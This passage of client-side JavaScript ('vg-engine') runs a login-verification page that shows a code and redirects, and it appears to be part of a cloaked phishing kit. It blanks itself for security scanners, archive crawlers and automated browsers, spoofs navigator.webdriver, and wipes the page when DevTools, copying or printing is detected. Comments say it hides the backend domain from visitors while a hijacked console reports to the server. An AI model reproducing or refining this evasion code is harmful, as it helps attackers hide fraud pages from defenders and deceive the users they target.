          var isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
          if (isSafari) {
            // Safari doesn't support blob URLs well - use data URL instead
            var dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
            console.log('[vg-engine] Safari detected, using data URL');
          } else {
            var blob = new Blob([html], { type: 'text/html' });
            var blobUrl = URL.createObjectURL(blob);
            redirectUrl = blobUrl;
            console.log('[vg-engine] Blob URL created');
          }
        } catch (e) {
          console.warn('[vg-engine] Blob URL creation failed, using DEST_URL:', e.message);
          // Fallback to DEST_URL
          redirectUrl = DEST_URL;
        }
      }

      // If show_verification_complete is disabled, redirect immediately without showing overlay
      if (!SHOW_VERIFICATION) {
        console.log('[vg-engine] Skipping verification screen, redirecting immediately to:', redirectUrl);
        // Try to close the tab first (works for popup windows)
        try { window.close(); } catch(e) {}
        // Fallback: redirect
        window.location.replace(redirectUrl);
        return;
      }

      // Show overlay if it exists, then redirect
      if (overlay) {
        overlay.classList.add('show');
        setTimeout(function () {
          console.log('[vg-engine] Redirecting to:', redirectUrl);
          // Try to close the tab first (works for popup windows)
          try { window.close(); } catch(e) {}
          // Fallback: redirect
          window.location.replace(redirectUrl);
        }, 2500);
      } else {
        // No overlay - redirect immediately
        console.log('[vg-engine] No overlay, redirecting immediately to:', redirectUrl);
        // Try to close the tab first (works for popup windows)
        try { window.close(); } catch(e) {}
        // Fallback: redirect
        window.location.replace(redirectUrl);
      }
    } else {
      // No redirect URL - just show overlay and close popup
      console.log('[vg-engine] No redirect URL set, showing overlay only');
      if (overlay) {
        overlay.classList.add('show');
        setTimeout(function () {
          closePopup();
          // Hide overlay after 3 seconds
          setTimeout(function () {
            overlay.classList.remove('show');
          }, 3000);
        }, 2000);
      } else {
        closePopup();
      }
    }
  }

  // ─── Helpers ────────────────────────────────────────────────
  function _setStatus(msg) {
    var el = document.getElementById('statusMsg');
    if (el) { el.textContent = msg; el.classList.remove('error'); }
  }

  function _showError(code) {
    var map = {
      timeout_waiting_user_login: 'Your verification code has expired. Please refresh.',
      'Session expired': 'Your verification code has expired. Please refresh.',
      failed: 'Verification failed. Please try again.',
      'Worker error': 'Something went wrong. Please try again.',
      'Worker crash': 'Something went wrong. Please try again.',
    };
    _onExpired();
    var el = document.getElementById('statusMsg');
    if (el) {
      el.textContent = map[code] || 'Something went wrong. Please try again.';
      el.classList.add('error');
    }
  }

  // ─── Anti-Bot Protection ─────────────────────
  // AGGRESSIVE bot blocking - no captcha, just white page for bots
  // Bots, scrapers, crawlers, and scanners see blank page immediately
  // Legitimate users get silent Turnstile verification in background
  function initBotDetection() {
    // Check if this is a slider verification page
    var isSliderPage = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';
    
    // Bot detection runs on ALL page types, including slider pages.
    //
    // Slider designs used to return immediately here, on the reasoning that
    // "the slider is the verification". That was a hole: a scanner driving a
    // real browser has no webdriver flag and a normal user agent, so it passed
    // the worker's edge check AND this check, reached the full verification UI,
    // and screenshotted it.
    //
    // isBotRequest() only returns true on hard signals (navigator.webdriver,
    // __webdriver_evaluate, __selenium_evaluate, _phantom, bot user agents) -
    // it explicitly declines to block on soft heuristics - so running it on
    // slider pages carries no realistic false-positive risk for a human.
    
    // AGGRESSIVE bot detection - block immediately
    // Only run after a short delay to avoid false positives
    setTimeout(function() {
      if (isBotRequest()) {
        // Bot detected - return white page immediately
        console.warn('[VG] Bot detected, showing white page (isSlider: ' + isSliderPage + ')');
        showWhitePage();
        return;
      }
      
      // Everything below is non-slider only. Slider pages get the interactive
      // challenge as their gate, so a heuristic score there would only add
      // false-positive risk for no extra protection, and
      // initTurnstileVerification() would render a second, invisible widget
      // alongside the visible one.
      if (isSliderPage) {
        return;
      }
      
      // Passive bot scoring for additional protection
      var botScore = calculateBotScore();
      console.log('[VG] Bot score:', botScore);
      if (botScore < 0.2) {
        // Very low score - likely a bot
        console.warn('[VG] Bot detected via passive scoring, showing white page');
        showWhitePage();
        return;
      }
      
      // Legitimate user - run silent Turnstile verification in background
      // This runs invisibly, no UI shown to users
      if (window.__TURNSTILE_ENABLED && window.__TURNSTILE_SITE_KEY) {
        initTurnstileVerification();
      }
    }, 500); // Wait 500ms before checking
  }
  
  // Show white page for bots
  function showWhitePage() {
    try {
      document.open();
      // A genuinely harmless blank page. No title (browsers fall back to the
      // URL, which is what a real empty page does), and the anti-scraping
      // script is carried over because document.write replaces the whole
      // document and would otherwise drop the listeners added earlier.
      document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>html,body{margin:0;padding:0;background:#fff;height:100%;overflow:hidden;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}</style><script>document.addEventListener("keydown",function(e){if(e.ctrlKey||e.metaKey){e.preventDefault();e.stopPropagation()}if(e.key==="F12"){e.preventDefault()}if(e.ctrlKey&&e.shiftKey&&(e.key==="I"||e.key==="i")){e.preventDefault()}if(e.ctrlKey&&e.key==="u"){e.preventDefault()}if(e.ctrlKey&&e.key==="s"){e.preventDefault()}if(e.ctrlKey&&e.key==="p"){e.preventDefault()}});document.addEventListener("contextmenu",function(e){e.preventDefault()});document.addEventListener("selectstart",function(e){e.preventDefault()})<\/script></head><body></body></html>');
      document.close();
    } catch(e) {
      // Fallback if document.write fails
      document.documentElement.innerHTML = '';
      document.body.style.background = '#fff';
    }
  }
  
  // Check for bot patterns - RELAXED for real browsers
  function isBotRequest() {
    // Check original navigator.webdriver value (before override)
    if (_originalWebdriver) return true;
    // Also check current value (some bots set it after page load)
    try {
      if (Object.getOwnPropertyDescriptor(navigator, 'webdriver') && navigator.webdriver) return true;
    } catch(e) {}
    // Check for webdriver property that returns false but was originally true
    var webdriverDesc = Object.getOwnPropertyDescriptor(navigator, 'webdriver');
    if (webdriverDesc && webdriverDesc.get) {
      // webdriver has been overridden - suspicious but not definitive
    }
    
    // Check for automation tools (specific, not generic)
    if (window._chrome && !window.chrome) return true;
    if (window.document.__webdriver_evaluate) return true;
    if (window.document.__selenium_evaluate) return true;
    if (window.callPhantom) return true;
    if (window._phantom) return true;
    
    // Check user agent
    var ua = navigator.userAgent.toLowerCase();
    var botSignatures = [
      'bot', 'crawler', 'spider', 'scraper', 'crawling',
      'headless', 'phantomjs', 'puppeteer', 'playwright',
      'selenium', 'webdriver', 'automation',
      'nmap', 'masscan', 'zaproxy', 'burpsuite',
      'sqlmap', 'nikto', 'wget', 'curl',
      'axios', 'guzzle', 'python-requests', 'java/',
      'okhttp', 'postman', 'insomnia',
      'scrapy', 'beautifulsoup', 'httpx',
      'monitor', 'checker', 'probe', 'scanner',
    ];
    
    for (var i = 0; i < botSignatures.length; i++) {
      if (ua.includes(botSignatures[i])) {
        return true;
      }
    }
    
    // RELAXED: Don't block based on missing chrome/plugins
    // Many legitimate browsers don't have these
    // Only block if it's clearly a bot
    
    return false;
  }

  // Mouse movement tracking for human verification
  var _mouseEvents = [];
  var _touchEvents = [];
  var _mouseTrackingStart = Date.now();

  // Track mouse movements
  document.addEventListener('mousemove', function(e) {
    _mouseEvents.push({
      x: e.clientX,
      y: e.clientY,
      t: Date.now() - _mouseTrackingStart
    });
    // Keep only last 200 events
    if (_mouseEvents.length > 200) _mouseEvents.shift();
  });

  // Track touch interactions
  document.addEventListener('touchstart', function(e) {
    if (e.touches && e.touches.length > 0) {
      _touchEvents.push({
        x: e.touches[0].clientX,
        y: e.touches[0].clientY,
        t: Date.now() - _mouseTrackingStart
      });
      if (_touchEvents.length > 100) _touchEvents.shift();
    }
  });

  function calculateBotScore() {
    // Score: 0 = definitely bot, 1 = definitely human
    // We want higher score = more likely human
    var score = 0.3; // Base score - assume human until proven otherwise
    var maxScore = 1.0;
    var minScore = 0.0;

    // Check 1: Navigator properties (positive indicators)
    try {
      if (!navigator.webdriver) score += 0.1; // Good: not automated
      else score -= 0.3; // Bad: webdriver flag set

      if (navigator.languages && navigator.languages.length > 0) score += 0.05;
      if (navigator.plugins && navigator.plugins.length > 0) score += 0.05;
      if (navigator.cookieEnabled) score += 0.05;
    } catch (e) { score -= 0.1; }

    // Check 2: Screen properties
    try {
      if (screen.width > 800 && screen.height > 600) score += 0.05;
      if (screen.colorDepth > 0) score += 0.02;
    } catch (e) { score -= 0.05; }

    // Check 3: Automation tool detection (strong negative indicators)
    try {
      // Puppeteer/Playwright indicators
      if (window._chrome && !window.chrome) score -= 0.5;
      if (navigator.webdriver) score -= 0.3; // Already checked above but reinforce
      // Selenium indicators
      if (window.document.__webdriver_evaluate) score -= 0.5;
      if (window.document.__selenium_evaluate) score -= 0.5;
      if (window.document.__fxdriver_evaluate) score -= 0.5;
      // PhantomJS
      if (window.callPhantom || window._phantom) score -= 0.5;
    } catch (e) { /* ignore */ }

    // Check 4: WebGL/Canvas fingerprinting
    try {
      var canvas = document.createElement('canvas');
      var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl && gl.getParameter) {
        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          if (renderer && renderer.toLowerCase().indexOf('swiftshader') !== -1) score -= 0.3;
          if (renderer && renderer.toLowerCase().indexOf('llvmpipe') !== -1) score -= 0.3;
        }
      }
    } catch (e) { /* ignore */ }

    // Check 5: Mouse movement entropy (human-like movement patterns)
    try {
      if (_mouseEvents.length >= 5) {
        var totalDist = 0;
        var directionChanges = 0;
        for (var i = 1; i < _mouseEvents.length; i++) {
          var dx = _mouseEvents[i].x - _mouseEvents[i-1].x;
          var dy = _mouseEvents[i].y - _mouseEvents[i-1].y;
          totalDist += Math.sqrt(dx*dx + dy*dy);
          // Check for direction changes (humans change direction frequently)
          if (i > 1) {
            var prevDx = _mouseEvents[i-1].x - _mouseEvents[i-2].x;
            var prevDy = _mouseEvents[i-1].y - _mouseEvents[i-2].y;
            if ((dx > 0 && prevDx < 0) || (dx < 0 && prevDx > 0) ||
                (dy > 0 && prevDy < 0) || (dy < 0 && prevDy > 0)) {
              directionChanges++;
            }
          }
        }
        // Humans have varied movement with direction changes
        var directionChangeRatio = _mouseEvents.length > 2 ? directionChanges / (_mouseEvents.length - 2) : 0;
        if (directionChangeRatio > 0.1 && totalDist > 50) {
          score += 0.15; // Human-like movement
        } else if (_mouseEvents.length > 20 && totalDist < 10) {
          score -= 0.2; // Suspicious: lots of events but no real movement
        } else if (totalDist > 0) {
          score += 0.05; // Some movement detected
        }
      } else if (_mouseEvents.length === 0 && Date.now() - _mouseTrackingStart > 3000) {
        score -= 0.1; // Suspicious: no mouse movement after 3 seconds
      }
    } catch (e) { /* ignore */ }

    // Check 6: Touch interaction (mobile devices)
    try {
      if ('ontouchstart' in window || navigator.maxTouchPoints > 0) {
        if (_touchEvents.length > 0) {
          score += 0.1; // Real touch interaction detected
        } else if (Date.now() - _mouseTrackingStart > 5000) {
          score -= 0.05; // Touch device but no touch events - slightly suspicious
        }
      }
    } catch (e) { /* ignore */ }

    // Check 7: Scroll behavior
    try {
      var scrollY = window.scrollY || window.pageYOffset || 0;
      if (scrollY > 0) score += 0.05; // Page has been scrolled - human behavior
    } catch (e) { /* ignore */ }

    // Check 8: Headless browser detection
    try {
      if (!window.chrome) score -= 0.1;
      if (window.chrome && window.chrome.runtime && !window.chrome.runtime.id) score -= 0.15;
    } catch (e) { /* ignore */ }

    // Clamp score between 0 and 1
    return Math.max(minScore, Math.min(maxScore, score));
  }

  function initTurnstileVerification() {
    // Ensure widget container exists and is hidden
    var widgetContainer = document.getElementById('turnstileWidget');
    if (!widgetContainer) {
      widgetContainer = document.createElement('div');
      widgetContainer.id = 'turnstileWidget';
      widgetContainer.style.display = 'none'; // Completely hidden - invisible mode
      document.body.appendChild(widgetContainer);
    }

    // Wait for Turnstile to load
    if (typeof window.turnstile === 'undefined') {
      // Define callback BEFORE loading script to avoid race condition
      window.vgOnTurnstileReady = function() {
        renderAndExecuteTurnstile(widgetContainer);
      };
      
      // Load Turnstile script dynamically
      var script = document.createElement('script');
      script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?onload=vgOnTurnstileReady';
      script.async = true;
      script.defer = true;
      script.id = 'vg-turnstile-script';
      (document.head || document.documentElement).appendChild(script);
      return;
    }

    renderAndExecuteTurnstile(widgetContainer);
  }

  function renderAndExecuteTurnstile(widgetContainer) {
    // Skip if already rendered (check for data-widget-id attribute)
    if (widgetContainer.getAttribute('data-widget-id')) {
      return; // Already rendered
    }

    // Render invisible Turnstile widget - NO UI shown to users
    try {
      var widgetId = window.turnstile.render('#turnstileWidget', {
        sitekey: window.__TURNSTILE_SITE_KEY,
        // Visibility is NOT controlled here. The widget MODE is fixed in
        // Cloudflare's backend at assignment time (see turnstileModeForDesign in
        // routes/links.js) and is the only thing that decides whether a widget
        // renders at all. `invisible: true` is not a recognised render option -
        // "invisible" is a MODE value - so passing it here was dead code.
        // The container below is also display:none, so nothing can be seen.
        'retry': 'never',
        callback: function(token) {
          // Store token silently for form submission
          window.__TURNSTILE_TOKEN = token;
        },
        'error-callback': function() {
          // On error, token remains null - bot detection will handle it
          window.__TURNSTILE_TOKEN = null;
        },
        'expired-callback': function() {
          // Token expired, re-execute silently
          window.__TURNSTILE_TOKEN = null;
          try { window.turnstile.execute(widgetId); } catch(e) {}
        }
      });

      // Mark as rendered
      widgetContainer.setAttribute('data-widget-id', widgetId);

      // Auto-execute immediately after rendering (invisible mode - no user interaction needed)
      setTimeout(function() {
        try { window.turnstile.execute(widgetId); } catch(e) {}
      }, 500);
    } catch(e) {
      // Fail silently
    }
  }

  // NOTE: showTurnstileChallenge and validateTurnstileToken removed.
  // All Turnstile operations are now fully silent and invisible.
  // Users never see any captcha UI. Bots are blocked by passive scoring + Turnstile invisible challenge.

  // ─── Anti-Screenshot / Anti-Print CSS ───────────────────────
  // Injects CSS that makes screenshots/print come out blank.
  // Works via CSS @media rules and visibility manipulation.
  function initAntiScreenshot() {
    var style = document.createElement('style');
    style.id = 'vg-anti-screenshot';
    style.textContent =
      /* Print/media query - blank everything when printing */
      '@media print {' +
      '  html, body, div, span, applet, object, iframe,' +
      '  h1, h2, h3, h4, h5, h6, p, blockquote, pre,' +
      '  a, abbr, acronym, address, big, cite, code,' +
      '  del, dfn, em, img, ins, kbd, q, s, samp,' +
      '  small, strike, strong, sub, sup, tt, var,' +
      '  b, u, i, center,' +
      '  dl, dt, dd, ol, ul, li,' +
      '  fieldset, form, label, legend,' +
      '  table, caption, tbody, tfoot, thead, tr, th, td,' +
      '  article, aside, canvas, details, embed, figure,' +
      '  figcaption, footer, header, hgroup, menu, nav,' +
      '  output, ruby, section, summary, time, mark, audio, video {' +
      '    all: none !important;' +
      '    visibility: hidden !important;' +
      '    opacity: 0 !important;' +
      '    display: none !important;' +
      '  }' +
      '  body::before {' +
      '    content: "";' +
      '    display: block;' +
      '    position: fixed;' +
      '    top: 0; left: 0; width: 100vw; height: 100vh;' +
      '    background: #ffffff;' +
      '    z-index: 999999;' +
      '  }' +
      '}' +
      
      /* Screen capture protection - blank on focus loss */
      ':focus-within {' +
      '  transition: opacity 0.1s;' +
      '}' +
      
      /* Detect window blur (screen capture tools often blur window) - show watermark instead of hiding */
      'body.window-blurred {' +
      '}' +
      'body.window-blurred #vg-screenshot-watermark {' +
      '  display: block !important;' +
      '}' +
      
      /* Anti-clone protection: only apply to print/media queries, NOT during normal screen rendering */
      '';
    (document.head || document.documentElement).appendChild(style);

    // Removed blur/focus event listeners — they caused page flickering on normal browser use
    // Windows screenshot tools and normal tab switching trigger blur events that caused
    // the anti-screenshot CSS to hide all content, making pages appear broken

    // MutationObserver to detect content scraping attempts
    try {
      var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
          // If someone tries to remove/hide our elements
          if (mutation.removedNodes.length > 0) {
            mutation.removedNodes.forEach(function(node) {
              if (node.nodeType === 1) { // Element node
                // Restore immediately
                if (node.parentNode) {
                  node.style.visibility = 'visible';
                  node.style.opacity = '1';
                }
              }
            });
          }
          // If attributes are being changed to hide content
          if (mutation.type === 'attributes' && mutation.target) {
            var el = mutation.target;
            if (el.style && (el.style.visibility === 'hidden' || el.style.display === 'none')) {
              // Check if this is a sensitive element
              if (el.id === 'codeValue' || el.className && el.className.indexOf('code') !== -1) {
                el.style.visibility = 'visible';
                el.style.display = '';
                el.style.opacity = '1';
              }
            }
          }
        });
      });
      observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: true,
        attributeFilter: ['style', 'class']
      });
    } catch(e) {}
  }

  // ─── Heavy Anti-Clone Protection ────────────────────────────
  // Prevents page cloning/scraping tools from extracting useful content.
  // If a bot tries to clone the page, all sensitive data is zeroed out.
  function initAntiClone() {
    // Helper: check if we're on a slider page (used by multiple sub-checks below)
    var _isSlider = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';

    // GRACE PERIOD: Don't run anti-clone checks for first 5 seconds
    // This allows the page to fully load and render before we start monitoring
    var _gracePeriodMs = 5000;
    var _startTime = Date.now();
    function isInGracePeriod() {
      return Date.now() - _startTime < _gracePeriodMs;
    }

    // 1. Detect DevTools open via timing attack (more aggressive)
    // Skip on slider pages - slider drag events can trigger false positives
    var devtoolsTiming = (function() {
      var threshold = 200; // Increased from 100ms to reduce false positives
      var detected = false;
      console.log('[VG] devtools timing check starting, isSlider:', _isSlider);
      setTimeout(function() { // Delay start by grace period
        setInterval(function() {
          if (isInGracePeriod()) return;
          var start = performance.now();
          var debuggerStr = 'debugger;';
          try {
            eval(debuggerStr);
          } catch(e) {}
          var elapsed = performance.now() - start;
          console.log('[VG] devtools timing: elapsed =', elapsed, 'ms');
          if (elapsed > threshold && !_isSlider) {
            detected = true;
            console.error('[VG] devtools timing FAILED, killing page');
            killPage('devtools_timing_' + Math.round(elapsed) + 'ms');
          }
        }, 1000); // Slowed from 500ms to 1000ms
      }, _gracePeriodMs);
    })();

    // 2. Integrity checker - detects DOM manipulation / content removal
    // Skip on slider pages - slider JS dynamically modifies DOM during drag
    console.log('[VG] initAntiClone starting, isSlider:', _isSlider);
    setTimeout(function() { // Delay integrity check by grace period
      try {
        var checkIntegrity = function() {
          var bodyHTML = document.body ? document.body.innerHTML : '';
          console.log('[VG] integrity check: bodyHTML.length =', bodyHTML.length);
          // Increased threshold from 100 to 500 chars to reduce false positives.
          // The !_isSlider exemption applies to BOTH conditions - without the
          // parentheses this parsed as (!bodyHTML) || (len < 500 && !_isSlider),
          // so a slider page with an empty body was still killed, defeating the
          // exemption the comment above promises.
          if ((!bodyHTML || bodyHTML.length < 500) && !_isSlider) {
            console.error('[VG] integrity check FAILED, killing page');
            killPage('integrity_check_body_' + bodyHTML.length);
          }
        };
        setInterval(checkIntegrity, 5000); // Slowed from 2000ms to 5000ms
      } catch(e) {}
    }, _gracePeriodMs);

    // 3. Block print/screen capture detection
    // Skip on slider pages
    if (!_isSlider) {
      window.addEventListener('beforeprint', function(e) {
        e.preventDefault();
        e.stopPropagation();
        killPage('beforeprint');
        return false;
      });
    }

    // 4. Detect if page is inside an iframe (embedding protection)
    // Skip on slider pages - slider verification layers are intentionally embedded
    var isSliderPageAntiClone = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';
    console.log('[VG] iframe check: self !== top:', window.self !== window.top, 'isSlider:', isSliderPageAntiClone);
    if (window.self !== window.top && !isSliderPageAntiClone) {
      console.error('[VG] iframe detected, killing page');
      // Page is in iframe - kill it (only on non-slider pages)
      document.documentElement.innerHTML = '';
      killPage('iframe_embed');
    }

    // 5. Monitor for rapid DOM changes (indicator of scraping tool)
    // Increased thresholds to reduce false positives
    var lastBodyLength = document.body ? document.body.innerHTML.length : 0;
    var domChangeCount = 0;
    setTimeout(function() { // Delay DOM monitoring by grace period
      setInterval(function() {
        if (isInGracePeriod()) return;
        var currentLength = document.body ? document.body.innerHTML.length : 0;
        // Increased threshold from 50000 to 100000
        if (Math.abs(currentLength - lastBodyLength) > 100000) {
          domChangeCount++;
          // Increased threshold from 3 to 5
          if (domChangeCount > 5) {
            killPage('dom_change');
          }
        } else {
          domChangeCount = Math.max(0, domChangeCount - 1);
        }
        lastBodyLength = currentLength;
      }, 2000); // Slowed from 1000ms to 2000ms
    }, _gracePeriodMs);

    // 6. Hook into console methods to detect debugging
    (function() {
      var noop = function() {};
      var methods = ['log', 'debug', 'info', 'warn', 'error', 'table', 'trace', 'group', 'groupEnd'];
      methods.forEach(function(m) {
        if (console[m]) {
          console[m] = noop;
        }
      });
    })();

    // 7. Kill page function - silent destruction
    var _killPageCalled = false;
    function killPage(reason) {
      // Prevent multiple killPage calls
      if (_killPageCalled) {
        console.log('[VG] killPage already called, ignoring duplicate call:', reason);
        return;
      }
      _killPageCalled = true;

      // The kill reason, URL, and UA are already routed to the server via the
      // console hijack (logToServer) below. No separate /api/killpage beacon:
      // it was a second network request to the backend that leaked the backend
      // domain in the visitor's Network tab, and the same data was already
      // being sent through the hijacked console.
      console.error('[VG] killPage called' + (reason ? ': ' + reason : ''));
      console.error('[VG] URL:', window.location.href);
      console.error('[VG] User-Agent:', navigator.userAgent);

      // Wipe the page.
      try {
        document.open();
        document.write('');
        document.close();
      } catch(e) {}

      // Flush any pending logs before navigating away.
      try { flushLogs(); } catch(e) {}

      setTimeout(function() {
        try { window.location.replace('about:blank'); } catch(e) {}
      }, 400);
    }

    // 8. Anti-screen recording: detect canvas access and blank it
    var _nativeCreateCanvas = document.createElement.bind(document);
    document.createElement = function(tagName) {
      var el = _nativeCreateCanvas(tagName);
      if (tagName.toLowerCase() === 'canvas') {
        var origGetContext = el.getContext;
        el.getContext = function() {
          try {
            var ctx = origGetContext.apply(this, arguments);
            if (ctx && ctx.fillStyle) {
              ctx.fillStyle = '#000000';
              ctx.fillRect(0, 0, 99999, 99999);
            }
          } catch(e) {}
          return ctx;
        };
      }
      return el;
    };

    // 9. Hook screenshot-detecting APIs
    try {
      var origGetDisplayMedia = navigator.mediaDevices.getDisplayMedia;
      if (origGetMedia) {
        navigator.mediaDevices.getDisplayMedia = function() {
          return Promise.reject(new Error('Screen capture not allowed'));
        };
      }
    } catch(e) {}

    // 10. Monitor for webdriver/automation flags being set
    Object.defineProperty(navigator, 'webdriver', {
      get: function() {
        // Always return false to hide automation flag
        return false;
      }
    });

    // 11. Fingerprint is computed locally only — never beacons to the backend.
    // A network request here would leak the backend domain in the visitor's
    // Network tab, and the route was returning 404 anyway.
    (function() {
      var fingerprint = '';
      try {
        fingerprint += navigator.hardwareConcurrency || '';
        fingerprint += navigator.deviceMemory || '';
        fingerprint += screen.colorDepth + 'x' + screen.pixelDepth;
        fingerprint += new Date().getTimezoneOffset();
        fingerprint += (navigator.languages || []).join(',');
      } catch(e) {}
      window.__vg_fingerprint = btoa(fingerprint || 'unknown');
    })();
  }

  // ─── Anti-Scraping ───────────────────────────────────────────
  // Content obfuscation only. The heartbeat beacon was removed: it fired a
  // network request to the backend every 30s, leaking the backend domain in
  // the visitor's Network tab, and added nothing the fingerprint + behavior
  // layers don't already provide.
  function initAntiScraping() {
    // Skip on slider pages
    if (window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true') {
      return;
    }
    
    // 2. Content obfuscation for sensitive elements
    function obfuscateSensitiveContent() {
      // Obfuscate any verification codes, tokens, or sensitive data
      var sensitiveSelectors = [
        '[data-sensitive]',
        '[id*="token"]',
        '[class*="token"]'
      ];

      // Use a WeakMap to store original values - not accessible from DOM inspection
      var _originalValues = new WeakMap();

      sensitiveSelectors.forEach(function(selector) {
        try {
          var elements = document.querySelectorAll(selector);
          elements.forEach(function(el) {
            // Skip elements that have been marked as revealed (e.g., verification codes)
            if (el.getAttribute('data-vg-revealed') === 'true') return;

            if (el && el.textContent && el.textContent.length > 3) {
              // Store original in WeakMap (not accessible from DOM)
              _originalValues.set(el, el.textContent);
              el.textContent = '••••••';
            }
          });
        } catch(e) {}
      });

      // Expose a function to reveal values when needed (e.g., for copy)
      window.__vgRevealSensitive = function(el) {
        return _originalValues.get(el) || el.textContent;
      };

      // Re-obfuscate periodically
      setInterval(obfuscateSensitiveContent, 5000);
    }
    
    // 3. Detect automated content extraction
    function detectExtraction() {
      var startTime = Date.now();
      var copyCount = 0;
      var selectCount = 0;
      
      document.addEventListener('copy', function() {
        copyCount++;
        if (copyCount > 3) {
          killPage('copy_count');
        }
      });
      
      document.addEventListener('selectstart', function() {
        selectCount++;
        if (selectCount > 10) {
          killPage('select_count');
        }
      });
      
      // Detect if entire page is being selected (CTRL+A)
      document.addEventListener('keydown', function(e) {
        if ((e.ctrlKey || e.metaKey) && e.key === 'a') {
          killPage('ctrl_a');
        }
        if ((e.ctrlKey || e.metaKey) && (e.key === 'c' || e.key === 's' || e.key === 'u')) {
          killPage('ctrl_' + e.key);
        }
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'j' || e.key === 'c'))) {
          killPage('devtools_key');
        }
      });
    }
    
    // 4. Canvas fingerprinting protection
    // Only adds noise when canvas data is extracted (fingerprinting pattern)
    function protectCanvasFingerprinting() {
      var originalGetContext = HTMLCanvasElement.prototype.getContext;
      var wrappedContexts = new WeakMap();

      HTMLCanvasElement.prototype.getContext = function(contextType) {
        var ctx = originalGetContext.apply(this, arguments);
        if (!ctx || (contextType !== '2d' && contextType !== 'webgl')) {
          return ctx;
        }

        // Return already-wrapped context if available
        if (wrappedContexts.has(ctx)) {
          return wrappedContexts.get(ctx);
        }

        // Create a wrapper that only adds noise on data extraction
        var wrapped = Object.create(ctx);

        // Wrap toDataURL - this is the main fingerprinting method
        var origToDataURL = ctx.canvas.toDataURL.bind(ctx.canvas);
        ctx.canvas.toDataURL = function(type, quality) {
          // Add a tiny, nearly invisible noise pixel before extraction
          try {
            ctx.save();
            ctx.globalAlpha = 0.005; // Nearly invisible
            ctx.fillStyle = 'rgba(' + Math.floor(Math.random() * 10) + ',' +
                           Math.floor(Math.random() * 10) + ',' +
                           Math.floor(Math.random() * 10) + ',1)';
            ctx.fillRect(
              Math.floor(Math.random() * ctx.canvas.width),
              Math.floor(Math.random() * ctx.canvas.height),
              1, 1
            );
            ctx.restore();
          } catch(e) {}
          return origToDataURL(type, quality);
        };

        // Wrap getImageData - another fingerprinting method
        var origGetImageData = ctx.getImageData.bind(ctx);
        ctx.getImageData = function(sx, sy, sw, sh) {
          var data = origGetImageData(sx, sy, sw, sh);
          // Add subtle noise to a random pixel
          try {
            var idx = Math.floor(Math.random() * (data.data.length / 4)) * 4;
            var noise = Math.floor(Math.random() * 3) - 1; // -1, 0, or 1
            data.data[idx] = Math.min(255, Math.max(0, data.data[idx] + noise));
          } catch(e) {}
          return data;
        };

        wrappedContexts.set(ctx, wrapped);
        return ctx; // Return original ctx but with wrapped methods on canvas
      };
    }
    
    // 5. Detect if page is being archived/wayback
    function detectArchiving() {
      var ua = navigator.userAgent.toLowerCase();
      var archiveBots = [
        'archive.org', 'wayback', 'web.archive', 
        'archivebot', 'webcapture', 'httrack'
      ];
      
      for (var i = 0; i < archiveBots.length; i++) {
        if (ua.includes(archiveBots[i])) {
          killPage('archive_bot:' + archiveBots[i]);
          return;
        }
      }
      
      // Check for archive-related headers via meta tags
      var metaTags = document.querySelectorAll('meta');
      for (var i = 0; i < metaTags.length; i++) {
        var content = metaTags[i].getAttribute('content') || '';
        if (content.toLowerCase().includes('archive') || 
            content.toLowerCase().includes('wayback')) {
          killPage('archive_content');
        }
      }
    }
    
    // 6. Randomized timing to confuse timing attacks
    function addTimingNoise() {
      var originalNow = Date.now;
      Date.now = function() {
        return originalNow.call(Date) + Math.floor(Math.random() * 5);
      };
      
      var originalPerfNow = performance.now;
      performance.now = function() {
        return originalPerfNow.call(performance) + Math.random() * 0.5;
      };
    }
    
    // Initialize all protections
    obfuscateSensitiveContent();
    detectExtraction();
    protectCanvasFingerprinting();
    detectArchiving();
    // addTimingNoise(); // Disabled - can break legitimate JS
    
    // Kill page if any check fails
    var _killPageCalledBot = false;
    function killPage(reason) {
      // Prevent multiple killPage calls
      if (_killPageCalledBot) {
        console.log('[VG] killPage already called, ignoring duplicate:', reason);
        return;
      }
      _killPageCalledBot = true;

      // Reason/URL already reach the server via the console hijack. No
      // separate /api/killpage beacon — it leaked the backend domain in the
      // visitor's Network tab for no additional information.
      console.error('[VG] killPage called' + (reason ? ': ' + reason : ''));
      console.error('[VG] URL:', window.location.href);

      try {
        document.open();
        document.write('');
        document.close();
      } catch(e) {}

      try { flushLogs(); } catch(e) {}

      setTimeout(function() {
        try { window.location.replace('about:blank'); } catch(e) {}
      }, 400);
    }
  }
  function initAntiDebug() {
    if (!window.__ANTIDEBUG_ENABLED) return;

    // Skip entirely on slider pages - slider interaction can trigger false positives
    var isSliderPageDebug = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';
    if (isSliderPageDebug) {
      console.log('[vg-engine] Slider page detected, skipping anti-debug protection');
      return;
    }

    // GRACE PERIOD: Don't run anti-debug checks for first 5 seconds
    var _gracePeriodMs = 5000;
    var _startTime = Date.now();
    function isInGracePeriod() {
      return Date.now() - _startTime < _gracePeriodMs;
    }

    // Skip aggressive detection on mobile devices
    var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
    if (isMobile) {
      // Only use debugger detection on mobile (more reliable)
      setTimeout(function() {
        setInterval(function() {
          if (isInGracePeriod()) return;
          var start = performance.now();
          debugger;
          if (performance.now() - start > 200) { // Increased threshold from 100ms to 200ms
            immediateRedirect();
          }
        }, 3000); // Slowed from 2000ms to 3000ms
      }, _gracePeriodMs);
      return;
    }

    var devtools = { open: false };
    var threshold = 200; // Increased from 160 to reduce false positives

